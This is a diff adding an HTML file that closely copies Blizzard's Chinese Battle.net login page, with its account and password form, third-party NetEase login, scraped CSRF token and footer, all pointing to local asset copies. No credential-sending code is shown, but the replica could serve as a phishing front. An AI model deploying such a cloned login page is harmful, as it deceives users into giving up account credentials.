@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" type="text/css" media="all" href="./css/blizzard-web.min.1wdCb.css">
+    <link rel="stylesheet" type="text/css" media="all" href="./css/global.min.1QH3j-1.css">
+    <link rel="stylesheet" type="text/css" media="all" href="./css/nav-client.34AhO.css">
+    <link rel="stylesheet" type="text/css" media="(max-width:800px)" href="./css/nav-client-responsive.2L8V6.css">
+    <script type="text/javascript" src="./js/jquery-1.11.0.min.1UgDG-58-1.js"></script>
+    <script type="text/javascript" src="./js/toolkit.min.1yZwE-58-11.js"></script>
+    <script type="text/javascript" src="./js/core.min.26Ucq-58-1.js"></script>
+</head>
+
+<body>
+
+    <body class="cn zh-cn login-template web blizzard" data-embedded-state="STATE_LOGIN" data-baseurl="/login/zh"
+        data-cdnurl="" data-staticurl="/login/static" data-sharedstaticurl="/login/static/local-common"
+        data-securesupporturl="" data-project="login" data-projecturl="/login" data-locale="zh-cn" data-language="zh"
+        data-region="cn" data-loggedin="false" data-useragent="web" data-tagmanageraccount="GTM-589KTQ"
+        data-gtmdatalayer="[{'userAgent':'web','analyticsRequestUri':'/login/zh/','theme':'blizzard','errorCode':'','state':'STATE_LOGIN'}]"
+        data-nonce="iljPqZS7c0" data-srp-script-url="/login/static/js/login/0.srp6a-routines.worker.2Efyv.js"
+        data-pw-v2-worker-url="/login/static/js/login/upgrade-verifier.worker.20KF3.js"
+        data-v2-password-js="/login/static/js/login/account-password.117nV.js" data-network-error-message="请检查网络连接并重试。">
+        <script type="text/javascript" src="./js/analytics.min.1HAsh-58-1.js"></script>
+        <div class="grid-container wrapper">
+            <div class="center-wrapper">
+                <h1 class="logo">暴雪游戏通行证登录</h1>
+                <div class="hide" id="info-wrapper">
+                    <h2><strong class="info-title"></strong></h2>
+                    <p class="info-body"></p>
+                    <button class="btn btn-block hide visible-phone" id="info-phone-close">关闭</button>
+                </div>
+                <div class="input" id="login-wrapper">
+                    <div class="login">
+                        <form action="" method="post" id="password-form" novalidate="novalidate" class="
+username-required
+input-focus">
+                            <div id="login-input-container" class="">
+                                <div id="js-errors" class="alert alert-error alert-icon hide">
+                                    <p id="cookie-check" class="hide">您的浏览器cookie已被禁用。需要重新启用cookie功能之后才能继续。</p>
+                                </div>
+                                <noscript>
+                                    <div id="javascript-disabled" class="alert alert-error alert-icon">
+                                        要正常浏览该网站，请开启浏览器的JavaScript支持。
+                                    </div>
+                                </noscript>
+                                <div class="control-group">
+                                    <label id="accountName-label" class="control-label"
+                                        for="accountName">电子邮箱或手机号码</label>
+                                    <div class="controls">
+                                        <input aria-labelledby="accountName-label" id="accountName" name="accountName"
+                                            title="电子邮箱或手机号码" maxlength="320" type="text" tabindex="1"
+                                            class="input-block input-large" placeholder="电子邮箱或手机号码" autocorrect="off"
+                                            spellcheck="false">
+                                        <span class="input-after"></span>
+                                    </div>
+                                </div>
+                                <div class="control-group">
+                                    <label id="password-label" class="control-label" for="password">密码</label>
+                                    <div class="controls">
+                                        <input aria-labelledby="password-label" id="password" name="password" title="密码"
+                                            maxlength="128" type="password" tabindex="1" class="input-block input-large"
+                                            autocomplete="off" placeholder="密码" autocorrect="off" spellcheck="false">
+                                        <span class="input-after"></span>
+                                    </div>
+                                </div>
+                                <input type="hidden" id="srpEnabled" name="srpEnabled" value="true">
+                                <input type="hidden" id="upgradeVerifier" name="upgradeVerifier" value="">
+                                <input type="hidden" id="useSrp" name="useSrp" value="false">
+                                <input type="hidden" id="publicA" name="publicA" value="">
+                                <input type="hidden" id="clientEvidenceM1" name="clientEvidenceM1" value="">
+                                <div class="persistWrapper">
+                                    <label id="persistLogin-label" class="checkbox-label css-label hide"
+                                        for="persistLogin">
+                                        <input aria-labelledby="persistLogin-label" id="persistLogin"
+                                            name="persistLogin" type="checkbox" checked="checked" tabindex="1">
+                                        <span class="input-checkbox"></span>
+                                        保持登录状态
+                                    </label>
+                                </div>
+                            </div>
+                            <div class="control-group submit ">
+                                <button type="submit" id="submit" class="btn btn-primary btn-large btn-block "
+                                    data-loading-text="" tabindex="1">
+                                    登录
+                                    <i class="spinner-battlenet"></i>
+                                </button>
+                            </div>
+                            <input type="hidden" id="csrftoken" class="csrftoken" name="csrftoken"
+                                value="95ace07b-602c-4831-aa09-e37457dbaf82">
+                            <input type="hidden" id="sessionTimeout" name="sessionTimeout" value="1588127657172">
+                        </form>
+                        <div class="thirdparty-line">
+                            <span>或使用以下账号登录</span>
+                        </div>
+                        <div class="useResponse social-login external-login-container">
+                            <form method="post" action="/login/signin/netease" id="neteaseLogin"
+                                class="third-party-login " enctype="">
+                                <button id="netease" class="btn btn-block btn-large btn-tertiary" rel="external"
+                                    tabindex="1">
+                                    <i class="icon-netease"></i>
+                                    网易通行证
+                                </button>
+                                <input type="hidden" name="scope" value="">
+                                <input type="hidden" name="ref" value="">
+                                <input type="hidden" name="app" value="">
+                                <input type="hidden" name="scheme" value="">
+                                <input type="hidden" id="csrftoken-neteaseLogin" class="csrftoken" name="csrftoken"
+                                    value="95ace07b-602c-4831-aa09-e37457dbaf82">
+                            </form>
+                        </div>
+                        <ul id="help-links">
+                            <li>
+                                <a rel="internal" href="" tabindex="1" id="signup">
+                                    免费创建暴雪游戏通行证
+                                </a>
+                            </li>
+                            <li>
+                                <a rel="internal" href="" tabindex="1" id="loginSupport">
+                                    无法登录？
+                                </a>
+                            </li>
+                            <li>
+                                <a rel="internal" href="" tabindex="1" id="tokenResync">
+                                    安全令重新同步
+                                </a>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+            <img src="./images/sprite-24-red.4Q3bt.png" class="hide">
+            <img src="./images/spinner-battlenet.1IdwV.png" class="hide">
+            <footer id="footer" class="footer zh-cn">
+                <div id="nav-client-footer" class="nav-client">
+                    <div class="mobileFooterEnabled footer-content footer-desktop grid-container">
+                        <div class="nav-section support-feedback">
+                            <div class="nav-left">
+                                <div id="nav-feedback">
+                                    <a class="nav-item nav-a nav-item-btn" href="javascript:;"
+                                        data-track-id="security-center-footer"><i
+                                            class="nav-icon-24-blue nav-icon-globe"></i>安全中心</a>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="nav-section">
+                            <div class="nav-left nav-logo-group">
+                                <div class="footer-links nav-left">
+                                    <a class="nav-item nav-a" href="" data-analytics="global-nav"
+                                        data-analytics-placement="Footer - eula">Battle.net EULA</a>
+                                    <span>|</span>
+                                    <a class="nav-item nav-a" href="" data-analytics="global-nav"
+                                        data-analytics-placement="Footer - Privacy">隐私</a>
+                                    <span>|</span>
+                                    <a class="nav-item nav-a" href="" data-analytics="global-nav"
+                                        data-analytics-placement="Footer - Terms">法律条款</a>
+                                    <span>|</span>
+                                    <a class="nav-item nav-a" href="" data-analytics="global-nav"
+                                        data-analytics-placement="Footer - copyright">著作权侵权</a>
+                                    <div class="link-row"></div>
+                                    <a class="nav-item nav-a" href="./images/license.jpg" data-analytics="global-nav"
+                                        data-analytics-placement="Footer - CN License">沪网文〔2017〕9633-727号</a>
+                                    <span>|</span>
+                                    <a class="nav-item nav-a" href="javascript:;" data-analytics="global-nav"
+                                        data-analytics-placement="Footer - CN Portal">增值电信业务经营许可证编号：沪B2－20080012</a>
+                                    <div class="link-row"></div>
+                                    <span class="nav-item nav-text">互联网违法和不良信息举报电话：0571-28090163</span>
+                                    <span>|</span>
+                                    <span class="nav-item nav-text">沪公网安备：31011502002167</span>
+                                    <div class="copyright">©2020暴雪娱乐有限公司版权所有。</div>
+                                    <div class="nav-footer-icon-container">
+                                        <ul class="nav-footer-icon-list">
+                                            <li class="nav-footer-icon-list-item"><a
+                                                    class="nav-footer-icon-link footer-icon-cyberpolice"
+                                                    href="javascript:;" target="_blank"></a></li>
+                                            <li class="nav-footer-icon-list-item"><a
+                                                    class="nav-footer-icon-link footer-icon-zx100" href="javascript:;"
+                                                    target="_blank"></a></li>
+                                            <li class="nav-footer-icon-list-item"><a
+                                                    class="nav-footer-icon-link footer-icon-sgs" href="javascript:;"
+                                                    target="_blank"></a></li>
+                                            <li class="nav-footer-icon-list-item"><a
+                                                    class="nav-footer-icon-link footer-icon-shjbzx" href="javascript:;"
+                                                    target="_blank"></a></li>
+                                        </ul>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="nav-ratings">
+                            </div>
+                        </div>
+                    </div>
+                    <div class="mobileFooterEnabled footer-content footer-mobile grid-container">
+                        <div class="nav-logo-group">
+                            <div class="footer-links">
+                                <a class="nav-item nav-a" href="" data-analytics="global-nav"
+                                    data-analytics-placement="Footer - eula">Battle.net EULA</a>
+                                <span>|</span>
+                                <a class="nav-item nav-a" href="" data-analytics="global-nav"
+                                    data-analytics-placement="Footer - Privacy">隐私</a>
+                                <span>|</span>
+                                <a class="nav-item nav-a" href="" data-analytics="global-nav"
+                                    data-analytics-placement="Footer - Terms">法律条款</a>
+                                <span>|</span>
+                                <a class="nav-item nav-a" href="" data-analytics="global-nav"
+                                    data-analytics-placement="Footer - copyright">著作权侵权</a>
+                            </div>
+                            <div class="footer-links footer-additional-links">
+                                <a class="nav-item nav-a" href="./images/license.jpg" data-analytics="global-nav"
+                                    data-analytics-placement="Footer - CN License">沪网文〔2017〕9633-727号</a>
+                                <span>|</span>
+                                <a class="nav-item nav-a" href="javascript:;" data-analytics="global-nav"
+                                    data-analytics-placement="Footer - CN Portal">增值电信业务经营许可证编号：沪B2－20080012</a>
+                                <div class="link-row"></div>
+                                <span class="nav-item nav-text">互联网违法和不良信息举报电话：0571-28090163</span>
+                                <span>|</span>
+                                <span class="nav-item nav-text">沪公网安备：31011502002167</span>
+                            </div>
+                            <div class="copyright">©2020暴雪娱乐有限公司版权所有。</div>
+                            <div class="nav-footer-icon-container">
+                                <ul class="nav-footer-icon-list">
+                                    <li class="nav-footer-icon-list-item"><a
+                                            class="nav-footer-icon-link footer-icon-cyberpolice" href="javascript:;"
+                                            target="_blank"></a></li>
+                                    <li class="nav-footer-icon-list-item"><a
+                                            class="nav-footer-icon-link footer-icon-zx100" href="javascript:;"
+                                            target="_blank"></a></li>
+                                    <li class="nav-footer-icon-list-item"><a
+                                            class="nav-footer-icon-link footer-icon-sgs" href="javascript:;"
+                                            target="_blank"></a></li>
+                                    <li class="nav-footer-icon-list-item"><a
+                                            class="nav-footer-icon-link footer-icon-shjbzx" href="javascript:;"
+                                            target="_blank"></a></li>
+                                </ul>
+                            </div>
+                            <div class="nav-ratings">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </footer>
+        </div>
+        <script type="text/javascript" src="./js/embed-0.1.5.min.2QnZN-58-1.js"></script>
+        <script type="text/javascript" src="./js/global.min.22cjf.js"></script>
+        <script type="text/javascript" src="./js/login.min.3D8nJ.js"></script>
+        <script type="text/javascript" src="./js/srp-client.min.2NkGE-1.js"></script>
+        <script type="text/javascript" src="./js/toolkit-password.1RRZg-1.js"></script>
+    </body>
+</body>
+
+</html>
